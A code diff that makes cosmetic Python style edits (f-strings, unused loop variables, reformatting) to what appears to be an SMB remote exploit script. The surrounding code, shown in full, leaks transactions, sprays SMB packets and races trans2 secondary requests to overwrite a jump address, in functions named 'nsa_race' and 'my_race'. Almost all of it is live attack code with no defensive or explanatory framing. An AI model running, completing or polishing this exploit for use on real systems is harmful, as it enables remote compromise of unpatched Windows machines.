@@ -17,7 +17,7 @@ Note:
 
 
 if len(sys.argv) != 3:
-	print("{} <ip> <pipe_name>".format(sys.argv[0]))
+	print(f"{sys.argv[0]} <ip> <pipe_name>")
 	sys.exit(1)
 
 target = sys.argv[1]
@@ -81,7 +81,7 @@ fid = conn.nt_create_andx(tid, pipe_name)  # any valid share name should be OK
 # ================================
 # leak a transaction
 # ================================
-for i in range(10):
+for _ in range(10):
 	conn.send_trans('', totalDataCount=0xdb0, maxSetupCount=0, maxParameterCount=0, maxDataCount=0)
 
 mid_ntrename = conn.next_mid()
@@ -89,7 +89,16 @@ mid_ntrename = conn.next_mid()
 req1 = conn.create_nt_trans_packet(5, mid=mid_ntrename, param=pack('<HH', fid, 0), data='A'*0x1b8, maxParameterCount=0x4e48)
 # leak 264 bytes
 req2 = conn.create_nt_trans_secondary_packet(mid_ntrename, data='A'*264)
-reqs = [ conn.create_trans_packet('', totalDataCount=0xdb0, maxSetupCount=0, maxParameterCount=0, maxDataCount=0) for i in range(15) ]
+reqs = [
+	conn.create_trans_packet(
+		'',
+		totalDataCount=0xDB0,
+		maxSetupCount=0,
+		maxParameterCount=0,
+		maxDataCount=0,
+	)
+	for _ in range(15)
+]
 
 conn.send_raw(req1[:-8])
 conn.send_raw(req1[-8:]+req2+''.join(reqs))
@@ -133,14 +142,14 @@ def nsa_race(conn, jmp_addr):
 def my_race(conn, jmp_addr):
 	setup = pack('<H', 5)  # QUERY_PATH_INFO
 	param = pack('<HI', 6, 0) + '\x00'*4  # infoLevel, reserved, filename
-	
+
 	# directly race
-	for i in range(8):
+	for _ in range(8):
 		mid = conn.next_mid()
 		req1 = conn.create_trans2_packet(setup, param=param, data='A'*324, mid=mid)
 		req3 = conn.create_trans2_secondary_packet(mid, data=pack('<Q', jmp_addr), dataDisplacement=312)
 		conn.send_raw(req1+req3*11)
-	for i in range(8):
+	for _ in range(8):
 		recvPkt = conn.recvSMB()
 		if recvPkt.getNTStatus() != 0xc0000010:
 			#print('return status: 0x{:x}'.format(recvPkt.getNTStatus()))
